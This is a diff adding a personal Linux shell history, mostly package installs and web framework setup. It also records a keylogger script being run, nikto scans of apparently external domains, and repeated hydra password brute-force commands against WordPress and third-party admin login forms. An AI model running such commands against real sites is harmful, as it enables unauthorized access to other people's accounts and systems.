@@ -1,0 +1,1000 @@
+  213  import pyxhook
+  214  python keylogger.py
+  215  pip Xlib
+  216  sudo apt install Xlib
+  217  sudo apt install python-pyxhook
+  218  sudo apt install pyxhook
+  219  sudo apt install python-xlib
+  220  python keylogger.py
+  221  cd ..
+  222  httrack
+  223  gvim
+  224  sudo apt-get install vim
+  225  vim
+  226  vim -g
+  227  gvim
+  228  exi
+  229  exit
+  230  man
+  231  vim man
+  232  man vim
+  233  sudo apt-get install vi
+  234  exit
+  235  sudo -i
+  236  pwds
+  237  pwd
+  238  ls
+  239  ls -l
+  240  ls -a
+  241  lsblk
+  242  uname
+  243  uname -a
+  244  history
+  245  cal
+  246  cal 11 2018
+  247  date
+  248  ps
+  249  clear
+  250  exit
+  251  cal
+  252  cal 09 18
+  253  uname
+  254  exit
+  255  locate -i card
+  256  locate -i card.html
+  257  clear
+  258  exit
+  259  sudo apt-get install nikto
+  260  nikto
+  261  nikto -h tuscantouche.com
+  262  nikto -h bluefinvest.com
+  263  clear
+  264  exit
+  265  atom -safe
+  266  atom --safe
+  267  apt-cache search php |grep -i emacs
+  268  sudo apt-get install php-elisp
+  269  clear
+  270  $ curl -v http://localhost/vmag/wp-login.php
+  271  sudo apt-get install curl
+  272  $ curl -v http://localhost/vmag/wp-login.php
+  273  sudo apt-get update
+  274  sudo apt-get updatesudo apt-get install libcurl3 php5-curl
+  275  sudo apt-get install libcurl3 php5-curl
+  276  hydra -l admin -P lists/pass.txt localhost -V http-form-post 'vmag/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=http://localhost/vmag/wp-admin//home/akshay/lists'
+  277  hydra -l admin -P /home/akshay/lists/list.txt -V http-form-post 'vmag/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=http://localhost/vmag/wp-admin//home/akshay/lists'
+  278  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post 'vmag/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=http://localhost/vmag/wp-admin//home/akshay/lists'
+  279  clear
+  280  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post '/vmag/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=http://localhost/vmag/wp-admin//home/akshay/lists'
+  281  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post '/vmag/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=http://localhost/vmag/wp-admin/
+  282  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post '/vmag/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=http://localhost/vmag/wp-admin/
+  283  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post '/vmag/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=http://localhost/vmag/wp-admin/
+  284  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post '/vmag/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=http://localhost/vmag/wp-admin/
+  285  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post '/vmag/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=http://localhost/vmag/wp-admin/'
+  286  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post 'http://jokendar.com/ntre/admin/users/login_form:data[User][username]=^USER^&data[User][password]=^PASS^&Login:Incorrect username/password'
+  287  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post '/http://jokendar.com/ntre/admin/users/login_form:data[User][username]=^USER^&data[User][password]=^PASS^&Login:Incorrect username/password'
+  288  pwd
+  289  cd /home/akshay/lists
+  290  pwd
+  291  history
+  292  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post '/http://jokendar.com/ntre/admin/users/login_form:data[User][username]=^USER^&data[User][password]=^PASS^&Login:Incorrect username/password'
+  293  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post '/http://jokendar.com/ntre/admin/users/login_form:data[User][username]=^USER^&data[User][password]=^PASS^&Login:hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post '/http://jokendar.com/ntre/admin/users/login_form:data[User][username]=^USER^&data[User][password]=^PASS^&Login:Incorrect username/password'Incorrect username/password'
+  294  hydra -l admin -P /home/akshay/lists/list.txt localhost -V http-form-post '/http://jokendar.com/ntre/admin/users/login_form:data[User][username]=^USER^&data[User][password]=^PASS^&Login:Incorrect username/password'
+  295  clear
+  296  hydra -l admin -P ~/Tools/wordlists/rockyou-75.txt 127.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Submit:Incorrect"
+  297  hydra -l admin -P /home/akshay/lists/list.txt 127.0.0.1 http-post-form "/vmag/login.php:username=^USER^&password=^PASS^&submit=Submit:Incorrect"
+  298  hydra -l admin -P /home/akshay/lists/list.txt localhost http-post-form "/vmag/login.php:username=^USER^&password=^PASS^&submit=Submit:Incorrect"
+  299  hydra -l admin -P /home/akshay/lists/list.txt localhost http-post-form "/vmag/login.php:username=^USER^&password=^PASS^"
+  300  clear
+  301  exit
+  302  sudo -i
+  303  cal 
+  304  man cal
+  305  ncal
+  306  history
+  307  clear
+  308  ifconfig
+  309  xrandr | grep ' connected'
+  310  xrandr | grep 'connected'
+  311  gedit
+  312  sudo dpkg --get-selections
+  313  httrack
+  314  su
+  315  sudo -i
+  316  chown -R akshay:akshay /opt/lampp/htdocs/jk4
+  317  sudo chown -R akshay:akshay /opt/lampp/htdocs/jk4
+  318  ls
+  319  pwd
+  320  dpkg --listfiles vscode
+  321  dpkg --listfiles visual-studio-code
+  322  pwd
+  323  ls
+  324  exit
+  325  history
+  326  xrandr | grep 'connected'
+  327  exiyt
+  328  exit
+  329  lsusb
+  330  clear
+  331  exit
+  332  sudo wireshark
+  333  exit
+  334  whereis setcap
+  335  sudo setcap 'CAP_NET_RAW+eip CAP_NET_ADMIN+eip' /usr/bin/dumpcap
+  336  sudo usermod -a -G wireshark akshay
+  337  wireshark
+  338  sudo wireshark
+  339  sudo chown root /usr/bin/dumpcap
+  340  sudo chmod u+s /usr/bin/dumpca
+  341  sudo chmod u+s /usr/sbin/dumpca
+  342  sudo chmod u+s /usr/bin/dumpcap
+  343  sudo wireshark
+  344  sudo chown -R akshay:akshay /opt/lampp/htdocs/storage
+  345  sudo chown -R akshay:akshay /opt/lampp/htdocs/opencart
+  346  httrack
+  347  exit
+  348  scrapy
+  349  pip install scrapy
+  350  clear
+  351  scrapy runspider quotes_spider.py -o quotes.json
+  352  scrapy
+  353  sudo apt-get install scrapy
+  354  pip install Scrapy
+  355  sudo apt-get install python-dev python-pip libxml2-dev libxslt1-dev zlib1g-dev libffi-dev libssl-dev
+  356  sudo apt-get install python3 python3-dev
+  357  pip install scrapy
+  358  ./setup.py
+  359  sudo ./setup.py
+  360  su 
+  361  sudo -i
+  362  tar -zxvf pyOpenSSL-0.13.tar.gz
+  363  cd pyOpenSSL-0.13
+  364  sudo python setup.py install
+  365  scrapy
+  366  hash -r
+  367  1
+  368  pip install Scrapy
+  369  scrapy version
+  370  sudo apt-get install python-dev
+  371  sudo apt-get install libevent-dev
+  372  sudo apt-get install libxml2 libxml2-dev
+  373  sudo apt-get install libxml2-dev libxslt-dev
+  374  sudo apt-get install python-lxml
+  375  sudo apt-get install python-twisted python-libxml2 python-simplejson
+  376  wget http://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz
+  377  wget http://pypi.python.org/packages/source/p/pycrypto/pycrypto-2.5.tar.gz
+  378  1
+  379  2
+  380  wget http://peak.telecommunity.com/dist/ez_setup.py2
+  381  wget https://peak.telecommunity.com/dist/ez_setup.py2
+  382  sudo easy_install Scrapy
+  383  scrapy
+  384  apt-get install python3-bs4
+  385  sudo apt-get install python3-bs4
+  386  ls
+  387  python quotes_spider.py
+  388  scrapy shell
+  389  wget http://peak.telecommunity.com/dist/ez_setup.py
+  390  python ez_setup.py
+  391  wget http://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz
+  392  wget http://pypi.python.org/packages/source/p/pycrypto/pycrypto-2.5.tar.gz
+  393  sudo easy_install -U w3lib
+  394  sudo easy_install Scrapy
+  395  python
+  396  python3
+  397  clear
+  398  pip lisy
+  399  pip list
+  400  Scrapy
+  401  python quotes_spider.py
+  402  sys.path
+  403  print sys.path
+  404  clear
+  405  shell
+  406  hash -r
+  407  print hash -r
+  408  exit
+  409  python bs4.py
+  410  python3 bs4.py
+  411  which python
+  412  which python3
+  413  which python3.2
+  414  python bs4.py
+  415  python3
+  416  python
+  417  from urllib.request import urlopen as uReq
+  418  python
+  419  nano ~/.bashrc
+  420  source ~/.bashrc
+  421  python
+  422  python mysoup.py
+  423  python bs4.py
+  424  python
+  425  python mysoup.py
+  426  clear
+  427  python
+  428  python2
+  429  which python2
+  430  python -m pip install -U pylint --user
+  431  /usr/bin/python3 -m pip install -U pylint --user
+  432  python3
+  433  sudo chmod -R 777 /opt/lampp/htdocs/opencart
+  434  httrack
+  435  python
+  436  python test.py
+  437  python for.py
+  438  python
+  439  python test.py
+  440  python mysoup-1.py
+  441  python scrape.py
+  442  sudo chown -R akshay:akshay /opt/lampp/htdocs/yeti
+  443  abc123
+  444  sudo chown -R akshay:akshay /opt/lampp/htdocs/yeti
+  445  vim
+  446  php
+  447  php version
+  448  php -version
+  449  exit
+  450  mysql -version
+  451  exit
+  452  python 
+  453  python random.py
+  454  python randon.py
+  455  cal
+  456  cal alt
+  457  cal 1
+  458  exit
+  459  wpscan
+  460  python
+  461  exit
+  462  history
+  463  ls
+  464  tar zxvf asterisk-15-current.tar.gz
+  465  cd /asterisk-15.4.1
+  466  cd asterisk-15.4.1
+  467  ./configure
+  468  make
+  469  make install
+  470  sudo apt-get install build-essential wget libssl-dev libncurses5-dev libnewt-dev libxml12-dev linux-headers-$(uname -r) libsqlite3-dev uuid-dev
+  471  sudo apt-get install build-essential wget libssl-dev libncurses5-dev libnewt-dev libxml2-dev linux-headers-$(uname -r) libsqlite3-dev uuid-dev
+  472  ./configure
+  473  sudo apt-get install libjansson-dev
+  474  ./configure
+  475  make menuconfig
+  476  make 
+  477  make install
+  478  sudo make install
+  479  cd /etc/asterisk/
+  480  ls
+  481  cd ..
+  482  cd
+  483  ls
+  484  cd asterisk-15.4.1
+  485  cd /Main
+  486  cd Main
+  487  ls
+  488  cd Asterisk
+  489  ls
+  490  cd asterisk-15.4.1
+  491  make samples
+  492  sudo make samples
+  493  cd /etc/asterisk
+  494  ls
+  495  ls -la | wc -l
+  496  asterisk -cvvv
+  497  sudo asterisk -cvvv
+  498  cd ..
+  499  cd
+  500  ls
+  501  cd Main
+  502  ls
+  503  cd Asterisk
+  504  ls
+  505  cd asterisk-15.4.1
+  506  ls -la
+  507  cd contrib/
+  508  ls
+  509  cd inti.d
+  510  cd inti.d/
+  511  cd init.d/
+  512  ls
+  513  type asterisk
+  514  vi /etc/init.d/asterisk
+  515  ls
+  516  cp rc.debian.asterisk /etc/init.d/asterisk
+  517  sudo cp rc.debian.asterisk /etc/init.d/asterisk
+  518  vi /etc/init.d/asterisk
+  519  type asterisk
+  520  vi /etc/init.d/asterisk
+  521  cd ..
+  522  cd
+  523  /etc/init.d/asterisk start
+  524  sudo /etc/init.d/asterisk start
+  525  /etc/init.d/asterisk stop
+  526  useradd -d /var/lib/asterisk asterisk
+  527  sudo useradd -d /var/lib/asterisk asterisk
+  528  cat /etc/passwd
+  529  su
+  530  gksu
+  531  sudo -i
+  532  python
+  533  ls
+  534  cd Main
+  535  ls
+  536  cd Python
+  537  ls
+  538  cd Automate\ the\ Boring\ Stuff\ with\ Python\ -\ Practical\ Programming\ for\ Total\ Beginners\ -\ 1st\ Edition\ \(2015\)\ \(Pdf\,\ Epub\ \&\ Mobi\)\ Gooner/
+  539  ls
+  540  cd ..
+  541  ls
+  542  cd examples
+  543  ls -la | wc ls
+  544  ls -la | wc l
+  545  ls -la | wc -l
+  546  exit
+  547  free -g
+  548  exit
+  549  gksu
+  550  sudo /etc/init.d/asterisk start
+  551  asterisk -r
+  552  asterisk -R
+  553  asterisk -r
+  554  sudo asterisk -r
+  555  ip addr
+  556  /etc/init.d/asterisk stop
+  557  exit
+  558  sudo apt remove -y vim-tiny
+  559  vi
+  560  sudo apt update
+  561  sudo apt install -y vim
+  562  sudo apt-get install vim
+  563  vi
+  564  vim
+  565  exit
+  566  ls -l index.php
+  567  ls -l index
+  568  nano
+  569  leafpad
+  570  sudo apt install leafpad
+  571  leafpad
+  572  clear
+  573  python
+  574  ls
+  575  cd Main
+  576  python
+  577  uptime
+  578  time
+  579  exit
+  580  python
+  581  sudo pip3 install xlrd
+  582  python
+  583  ls
+  584  cd Downloads/
+  585  ls
+  586  python
+  587  pwd
+  588  python
+  589  pwd
+  590  clear
+  591  cd
+  592  ls
+  593  cd Main
+  594  ls
+  595  cd Python
+  596  ls
+  597  cd xlsx
+  598  ls
+  599  pwd
+  600  python xlrd.py
+  601  python
+  602  clear
+  603  cd
+  604  python
+  605  python xlrd.py
+  606  cd
+  607  cd /Main/Python/
+  608  ls
+  609  cd Main/Python
+  610  ls
+  611  cd xlsx
+  612  ls
+  613  python xlrd.py
+  614  cd
+  615  clear
+  616  python
+  617  pwd
+  618  python xlrd.py
+  619  pip install pandas
+  620  python
+  621  clear
+  622  pip3 install pandas
+  623  python
+  624  clear
+  625  python
+  626  python pandas.py
+  627  python pandastest.py
+  628  python pandastest.py
+  629  clear
+  630  python pandastest.py
+  631  sudo /opt/lampp/uninstall
+  632  sudo /opt/lampp/install
+  633  gksudo
+  634  chown -R akshay:akshay /opt/lampp/htdocs
+  635  sudo chown -R akshay:akshay /opt/lampp/htdocs
+  636  gksu nautilus
+  637  clear
+  638  ls
+  639  ./start-tor-browser.desktop 
+  640  sudo su
+  641  ls
+  642  python
+  643  ls
+  644  cd Main
+  645  ls
+  646  cd Magento
+  647  ls
+  648  grep -r "if ($this->area)" *
+  649  grep -r "a" *
+  650  grep -r "$this->area" *
+  651  grep -r "this->area" *
+  652  grep -r "Area is already set" *
+  653  clear
+  654  grep -r "Area is already set" *
+  655  gksu nautilus
+  656  python manage.py runserver
+  657  sudo /opt/lampp/uninstall
+  658  gksu nautilus
+  659  sudo chown -R akshay:akshay /opt/lampp/htdocs
+  660  easy_install django
+  661  sudo apt-get install django
+  662  pip install django
+  663  ls
+  664  cd Desktop 
+  665  djando --version
+  666  django --version
+  667  django
+  668  django-admin --version
+  669  sudo apt install python-django-common
+  670  django-admin --version
+  671  cd
+  672  django-admin --version
+  673  cd Desktop
+  674  django-admin startproject test
+  675  sudo apt-get update
+  676  sudo apt-get install python-django
+  677  django-admin --version
+  678  django-admin startproject test
+  679  django-admin startproject akshay
+  680  django-admin runserver
+  681  python manage.py runserver
+  682  python
+  683  clear
+  684  sudo apt-get install python-django
+  685  python
+  686  pip3 install django
+  687  python
+  688  python manage.py runserver
+  689  python manage.py startapp polls
+  690  python manage.py runserver
+  691  python -m django --version
+  692  vi
+  693  exit
+  694  python herbaltrade.py
+  695  python code.py
+  696  python herbaltrade.py
+  697  clear
+  698  python herbaltrade.py
+  699  python herbaltrade.py
+  700  python
+  701  exit
+  702  python next.py
+  703  python jk-v2.py
+  704  python
+  705  clear
+  706  python
+  707  exit
+  708  sudo chown -R akshay:akshay /opt/lampp/htdocs/jkimport
+  709  ls
+  710  cd Desktop
+  711  django-main create-project mysite
+  712  main-django create-project mysite
+  713  django-admin startproject mysite
+  714  ls
+  715  cd mysite
+  716  ls
+  717  python manage.py startapp webapp
+  718  ls
+  719  cd ..
+  720  ls
+  721  cd mysite
+  722  ls
+  723  python manage.py runserver
+  724  exit
+  725  ls
+  726  cd mysite
+  727  cd Desktop
+  728  cd mysite
+  729  ls
+  730  python manage.py startapp personal
+  731  python manage.py runserver
+  732  exit
+  733  vi
+  734  ls
+  735  vi test.txt
+  736  exit
+  737  ping google.com
+  738  exit
+  739  sudo chown -R akshay:akshay /opt/lampp/htdocs/multiseller
+  740  sudo chmod -R 777 /opt/lampp/htdocs/multiseller
+  741  sudo chown -R akshay:akshay /opt/lampp/htdocs/storage
+  742  abc123
+  743  sudo chown -R akshay:akshay /opt/lampp/htdocs/storage
+  744  sudo chmod -R /opt/lampp/htdocs/multiseller
+  745  sudo chmod -R /opt/lampp/htdocs/multiseller/
+  746  sudo chmod 777  /opt/lampp/htdocs/multiseller/
+  747  gksu natulis
+  748  gksu nautilus
+  749  ls
+  750  cd /opt
+  751  ls
+  752  cd lampp/htdocs
+  753  create-project laravel/laravel lsapp
+  754  composer create-project laravel/laravel lsapp
+  755  sudo apt install composer
+  756  composer create-project laravel/laravel lsapp
+  757  sudo apt-get install php7.1-mbstring
+  758  cd /opt/lampp/htdocs
+  759  composer create-project laravel/laravel laravel
+  760  sudo apt-get install php-xml
+  761  composer create-project laravel/laravel laravel
+  762  composer create-project laravel/laravel lsapp
+  763  php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
+  764  php -r "if (hash_file('SHA384', 'composer-setup.php') === '544e09ee996cdf60ece3804abc52599c22b1f40f4323403c44d44fdfdd586475ca9813a858088ffbc1f233e9b180f061') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;"
+  765  php composer-setup.php
+  766  php -r "unlink('composer-setup.php');"
+  767  vi /etc/sysctl.conf
+  768  sudo vi /etc/sysctl.conf
+  769  httrack 
+  770  php artisan make:controller PagesController
+  771  npm install
+  772  sudo apt install npm
+  773  npm install
+  774  npm run dev
+  775  npm run watch
+  776  php artisan make:controller PostsController
+  777  php artisan make:model Post -m
+  778  clear
+  779  php artisan migrate
+  780  clear
+  781  php artisan migrate
+  782  chmod -R 777 storage
+  783  php artisan migrate
+  784  sudo php artisan migrate
+  785  clear
+  786  composer require doctrine/dbal
+  787  php artisan migrate
+  788  chmod -R 777 storage
+  789  sudo chmod -R 777 storage
+  790  php artisan migrate
+  791  clear
+  792  sudo chmod 777 /storage/logs/laravel.log
+  793  php artisan migrate
+  794  which php
+  795  php -v
+  796  php artisan migrate
+  797  clear
+  798  php artisan migrate
+  799  sudo apt install pdo_mysql
+  800  sudo apt install pdo-mysql
+  801  sudo apt install pdo_mysql
+  802  sudo apt-get install php7.0-mysql
+  803  sudo apt-get install php7.1-mysql
+  804  php artisan migrate
+  805  clear
+  806  php artisan migrate:rollback
+  807  php artisan migrate
+  808  clear
+  809  php artisan tinker
+  810  eixt
+  811  exit
+  812  php artisan make:controller PostsController --resource
+  813  php artisan route:list
+  814  \clear
+  815  composer require "laravelcollective/html":"^5.4.0"
+  816  clear
+  817  composer update
+  818  clear
+  819  php artisan config:clear
+  820  php artisan cache:clear
+  821  composer dump-autoload
+  822  clear
+  823  composer require unisharp/laravel-ckeditor
+  824  php artisan vendor:publish --tag=ckeditor
+  825  clear
+  826  cd /opt/lampp/htdocs/lsapp
+  827  history
+  828  npn run watch
+  829  npm run watch
+  830  vi
+  831  ls
+  832  rm test1234.text
+  833  rm test1234.txt
+  834  ls
+  835  rm test.txt
+  836  ls
+  837  find Main
+  838  find akshay
+  839  clear
+  840  cat Main
+  841  ls -alh
+  842  pwd
+  843  cd /opt/lampp/htdocs
+  844  cd lsapp
+  845  ls -alh
+  846  exit
+  847  php artisan config:clear
+  848  php artisan cache:clear
+  849  composer dump-autoload
+  850  clear
+  851  php artisan make:auth
+  852  php artisan make:migration add_user_id_to_posts
+  853  php artisan migrate
+  854  npm run work
+  855  history
+  856  npm run watch
+  857  cd
+  858  pwd
+  859  ls vim
+  860  ls vimrc
+  861  ls .vimrc
+  862  l
+  863  ls
+  864  xhost si:localuser:root
+  865  sudo xhost si:localuser:root
+  866  cal
+  867  calender
+  868  cal
+  869  exit
+  870  killall orca
+  871  cd opt/lampp/htdocs/lsapp/public
+  872  cd opt/lampp/htdocs/lsapp/public/
+  873  cd /opt/lampp/htdocs/lsapp/public/
+  874  ls
+  875  cd
+  876  ls
+  877  sudo chown -R akshay:akshay /opt/lampp/htdocs/lsapp/public/storage
+  878  sudo chown -R akshay:akshay /opt/lampp/htdocs/lsapp/public/storage/cover_images
+  879  php artisan make:migration add_cover_image_to_posts
+  880  php artisan migrate
+  881  php artisan storage:link
+  882  pip3 list
+  883  httrack
+  884  ls -alh
+  885  clear
+  886  history
+  887  ls
+  888  cd Desktop
+  889  ls
+  890  python xampp.py
+  891  python
+  892  cd Desktop
+  893  python xampp.py
+  894  cd /opt/lampp/htdocs/akshay
+  895  ls
+  896  python manage.py runserver
+  897  pip3 install mysqlclient
+  898  sudo apt-get install mysqlclient
+  899  sudo apt install mysqldb
+  900  sudo apt-get install mysql-server
+  901  cat 
+  902  cat m
+  903  man cat
+  904  man ls
+  905  exit
+  906  django-admin dbshell
+  907  clear
+  908  pip3 install mysqlclient
+  909  sudo apt install mysql-python
+  910  clear
+  911  ls
+  912  python manage.py migrate
+  913  sudo apt install mysqlclient
+  914  pip3 install mysqlclient
+  915  clear
+  916  sudo apt-get install libmysqlclient-dev
+  917  sudo dpkg --configure -a
+  918  sudo apt-get update
+  919  sudo apt-get install libmysqlclient-dev
+  920  sudo dpkg --configure -a
+  921  sudo apt-get install mysql-server-5.7
+  922  sudo apt-get install mysql-server
+  923  clear
+  924  cd /opt/lampp/htdocs/akshay
+  925  ls
+  926  django-admin runserver
+  927  clear
+  928  django-admin runserver
+  929  clear
+  930  history
+  931  python manage.py runserver
+  932  clear
+  933  python manage.py migrate
+  934  pip3 install matplotlib
+  935  python jk-v2.py
+  936  clear
+  937  python
+  938  clear
+  939  python
+  940  vi
+  941  exit
+  942  ls
+  943  cd mysite
+  944  ls
+  945  grep -i 'app' settings.py
+  946  grep -i 'application' settings.py
+  947  grep -w 'app' settings.py
+  948  cd ..
+  949  sudo dpkg --configure -a
+  950  mysql
+  951  sudo mysql
+  952  django-admin manage.py dbshell
+  953  python manage.py dbshell
+  954  sudo apt install mysqldb
+  955  sudo apt install mysqlclient
+  956  pip3 install mysqlclient
+  957  python manage.py dbshell
+  958  sudo python manage.py dbshell
+  959  sudo apt install mysql-python
+  960  pip3 install mysql-python
+  961  sudo python manage.py dbshell
+  962  pip install mysql-python
+  963  sudo python manage.py dbshell
+  964  mysql
+  965  sudo mysql
+  966  sudo gksu
+  967  sudo apt-get remove --purge mysql*
+  968  service mysql start
+  969  sudo apt install mysql
+  970  sudo apt install mysql-server
+  971  sudo apt-get remove --purge mysql*
+  972  sudo /opt/lampp/htdocs/uninstall
+  973  sudo /opt/lampp/uninstall
+  974  sudo python manage.py dbshell
+  975  ls
+  976  clear
+  977  ls
+  978  cd Desktop
+  979  ;s
+  980  ls
+  981  cd mysite
+  982  sudo python manage.py dbshell
+  983  sudo ./xampp-linux-x64-7.1.18-0-installer.run 
+  984  clear
+  985  cd /Desktop/mysite
+  986  cd Desktop/mysite
+  987  ls
+  988  cd
+  989  cd Desktop/mysite
+  990  ls
+  991  sudo python manage.py dbshell
+  992  pip3 install mysql-python
+  993  pip3 install mysqlclient
+  994  sudo python manage.py dbshell
+  995  django-admin dbshell
+  996  sudo django-admin dbshell
+  997  pip3 install mysqlclient
+  998  pip3 list
+  999  clear
+ 1000  python manage.py check
+ 1001  sudo apt-get install python-mysqldb
+ 1002  python manage.py check
+ 1003  clear
+ 1004  python manage.py check
+ 1005  clear
+ 1006  sudo django-admin dbshell
+ 1007  clear
+ 1008  pip install mysql-python
+ 1009  sudo django-admin dbshell
+ 1010  pip3 install mysqlclient
+ 1011  restart
+ 1012  exit
+ 1013  mysql
+ 1014  sudo apt install mysql-client-core-5.7
+ 1015  mysql
+ 1016  sudo mysql
+ 1017  cd Desktop/mysite
+ 1018  django-admin dbshell
+ 1019  sudo apt install mysql-server
+ 1020  django-admin dbshell
+ 1021  sudo /opt/lampp/uninstall
+ 1022  sudo apt-get remove --purge mysql*
+ 1023  clear
+ 1024  cd Main
+ 1025  cd
+ 1026  cd main
+ 1027  cd Main
+ 1028  ls
+ 1029  cd Softwares/
+ 1030  ls
+ 1031  sudo ./xampp-linux-x64-7.1.18-0-installer.run 
+ 1032  cd Desktop/mysite
+ 1033  python manage.py shell
+ 1034  pip3 list
+ 1035  python manage.py migrate
+ 1036  sudo apt install libmysqlclient
+ 1037  sudo apt install libmysqlclient-dev
+ 1038  python manage.py migrate
+ 1039  clear
+ 1040  mysql
+ 1041  mysql -u root
+ 1042  sudo apt install mysql-client-core-5.7
+ 1043  mysql
+ 1044  mysql -u root -p
+ 1045  mysql -u root
+ 1046  sudo apt-get update
+ 1047  python manage.py migrate
+ 1048  clear
+ 1049  sudo find / -type s
+ 1050  sudo apt-get install python-pip python-dev mariadb-server libmariadbclient-dev libssl-dev
+ 1051  python manage.py migrate
+ 1052  sudo apt install mysqld
+ 1053  clear
+ 1054  mysql -u 
+ 1055  mysql -u root
+ 1056  sudo service mysql status
+ 1057  sudo /etc/init.d/mysql start
+ 1058  mysql start
+ 1059  sudo service mysql restart
+ 1060  mysqld start
+ 1061  mysqld -u root
+ 1062  mysql
+ 1063  clear
+ 1064  sudo service mysqld start
+ 1065  clear
+ 1066  sudo apt-get install python-mysqldb
+ 1067  cd Desktop/mysite
+ 1068  python manage.py check
+ 1069  python manage.py migrate
+ 1070  clear
+ 1071  sudo service mysql restart
+ 1072  sudo chown -R akshay:akshay /opt/lampp/htdocs
+ 1073  mysql_install_db
+ 1074  sudo mysql_install_db
+ 1075  mysql
+ 1076  clear
+ 1077  sudo chown -R akshay:akshay /opt/lampp/htdocs/jk5
+ 1078  sudo wireshark
+ 1079  sudo gksu
+ 1080  pip3 list
+ 1081  pip3 install python-mysql
+ 1082  pip3 install mysql-python
+ 1083  clear
+ 1084  sudo apt get install mysql-python
+ 1085  sudo apt-get install mysql-python
+ 1086  clear
+ 1087  cd Desktop/mysite
+ 1088  python manage.py check
+ 1089  clear
+ 1090  ls
+ 1091  cd
+ 1092  ls
+ 1093  cd Desktop
+ 1094  ;s
+ 1095  ls
+ 1096  cd ~/.local/share/Trash
+ 1097  ls
+ 1098  cd files
+ 1099  ls
+ 1100  sudo rm var
+ 1101  sudo rm /var
+ 1102  sudo rm -r var
+ 1103  ./mysql -u root
+ 1104  mysql -u root
+ 1105  sudo service mysql start
+ 1106  sudo start mariadb
+ 1107  sudo service mariadb start
+ 1108  cd /var/lib/mysql
+ 1109  ls
+ 1110  mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
+ 1111  sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
+ 1112  sudo service mysql start
+ 1113  /var/lib/mysql
+ 1114  cd /var/lib/mysql
+ 1115  rm -r *
+ 1116  n
+ 1117  ls
+ 1118  sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
+ 1119  sudo service mysql start
+ 1120  sudo service mysqld start
+ 1121  clear
+ 1122  mysql -u root
+ 1123  systemctl start mysql.service
+ 1124  mysql -u root
+ 1125  mysql -u root -r
+ 1126  clear
+ 1127  sudo apt-get install python-mysqldb
+ 1128  cd Desktop/mysit
+ 1129  cd Desktop/mysite
+ 1130  ls
+ 1131  cat manage.py
+ 1132  clear
+ 1133  man grep
+ 1134  grep -v
+ 1135  grep -V
+ 1136  clear
+ 1137  whois akshayrathod.in
+ 1138  exit
+ 1139  python manage.py runserver
+ 1140  cd Desktop/mysite
+ 1141  python manage.py runserver
+ 1142  clear
+ 1143  django-admin runserver
+ 1144  sudo gksu
+ 1145  history
+ 1146  cd ~/.local/share/Trash
+ 1147  ls
+ 1148  cd files
+ 1149  ls
+ 1150  rm lampp
+ 1151  rm /lampp
+ 1152  rm -r lampp
+ 1153  sudo rm -r lampp
+ 1154  sudo rm -r mysql
+ 1155  sudo apt-get clean
+ 1156  c
+ 1157  cd
+ 1158  sudo apt-get clean
+ 1159  sudo apt-get -f install
+ 1160  sudo dpkg --configure -a
+ 1161  sudo apt-get -f install
+ 1162  sudo apt-get clean
+ 1163  sudo dpkg --configure -a
+ 1164  sudo apt-get clean
+ 1165  sudo dpkg --configure -a
+ 1166  sudo apt-get clean
+ 1167  sudo apt-get -f install
+ 1168  sudo apt-get update
+ 1169  sudo /opt/lampp/uninstall
+ 1170  sudo apt-get update
+ 1171  sudo apt-get install apache2
+ 1172  sudo apt-get php7.1
+ 1173  sudo apt-get php7
+ 1174  sudo apt-get install php7
+ 1175  sudo apt-get install php7.1
+ 1176  sudo vi /var/www/html/test.php
+ 1177  sudo apt-get install mysql-server
+ 1178  sudo apt-get install mysql-server-5.7
+ 1179  sudo gksu
+ 1180  sudo apt-get install mysql-server-5.7
+ 1181  mysql
+ 1182  history
+ 1183  sudo apt-get remove --purge mysql*
+ 1184  sudo apt --fix-broken install
+ 1185  sudo apt-get remove --purge mysql*
+ 1186  sudo apt-get install mysql-server
+ 1187  apt --fix-broken install
+ 1188  sudo apt --fix-broken install
+ 1189  sudo apt-get remove --purge mysql*
+ 1190  sudo apt --fix-broken install
+ 1191  sudo apt-get clean
+ 1192  sudo apt install mysql
+ 1193  sudo apt install mysql-server
+ 1194  sudo apt --fix-broken install
+ 1195  systemctl stop mysql.service
+ 1196  pidof -c /usr/sbin/mysqld 
+ 1197  ps awufx | grep mysql 
+ 1198  kill 2346
+ 1199  kill 14352
+ 1200  kill 1172
+ 1201  pidof -c /usr/sbin/mysqld
+ 1202  apt-get install mariadb-server-10.0 
+ 1203  sudo apt-get install mariadb-server-10.0 
+ 1204  sudo apt --fix-broken install
+ 1205  sudo dpkg -l | grep mysql
+ 1206  sudo apt-get --purge autoremove libdbd-mysql-perl
